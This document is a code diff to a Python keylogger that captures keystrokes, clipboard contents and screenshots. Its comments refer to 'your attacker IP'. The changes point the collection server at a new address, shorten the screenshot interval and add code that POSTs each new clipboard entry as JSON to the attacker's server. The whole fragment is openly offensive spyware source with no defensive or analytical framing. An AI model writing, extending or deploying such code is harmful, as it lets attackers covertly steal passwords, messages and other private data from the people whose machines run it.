@@ -27,10 +27,10 @@ keystrokes = ""  # Global variable to store captured keystrokes
 clipboard_data = ""  # Global variable to store clipboard content
 previous_clipboard_data = ""  # To track the previous clipboard content
 
-server_ip = "192.168.43.26"  # Change this based on your attacker IP
+server_ip = "127.0.0.1"  # Change this based on your attacker IP
 server_port = 8080  # Change this based on your specified port
-keystroke_clipboard_interval = 5  # Interval (in seconds) between sending keystrokes and clipboard data
-screenshot_interval = 10  # Interval (in seconds) between sending screenshots
+keystroke_clipboard_interval = 5  # Interval (in seconds) between sending keystrokes and clipboard data (Change if needed)
+screenshot_interval = 5  # Interval (in seconds) between sending screenshots (Change if needed)
 
 # Track whether Ctrl, Alt, Shift is pressed
 ctrl_pressed = False
@@ -117,7 +117,12 @@ def monitor_clipboard():
         current_clipboard_data = pyperclip.paste()  # Capture current clipboard content
         if current_clipboard_data != previous_clipboard_data and current_clipboard_data.strip() != "":
             previous_clipboard_data = current_clipboard_data
-            clipboard_data = current_clipboard_data
+            # Send the clipboard data to the server
+            payload = json.dumps({"clipboardData": current_clipboard_data})
+            try:
+                r = requests.post(f"http://{server_ip}:{server_port}", data=payload, headers={"Content-Type": "application/json"})
+            except Exception as e:
+                print(f"Failed to send clipboard data: {e}")
         time.sleep(1)  # Polling interval (Change if needed)
 
 # Set up and start the keyboard listener
